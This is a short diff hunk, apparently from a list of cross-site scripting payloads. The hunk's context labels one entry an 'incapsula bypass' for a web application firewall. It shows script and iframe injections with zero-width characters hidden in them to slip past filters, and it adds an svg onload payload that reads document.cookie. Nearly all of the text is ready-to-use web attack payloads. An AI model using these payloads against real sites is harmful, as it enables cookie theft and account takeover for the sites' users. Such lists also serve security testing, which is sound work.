@@ -151,3 +151,4 @@ incapsula bypass: <iframe/onload​="var b ='document.domain)'; var a = 'JaV' + 
 ]});</script><script>prompt();</script><!--
 '-alert?.(1)-'
 <​/script><​script>alert(1234)<​/script>
+orwa%27\"><svg/onload​=alert(document.cookie)>
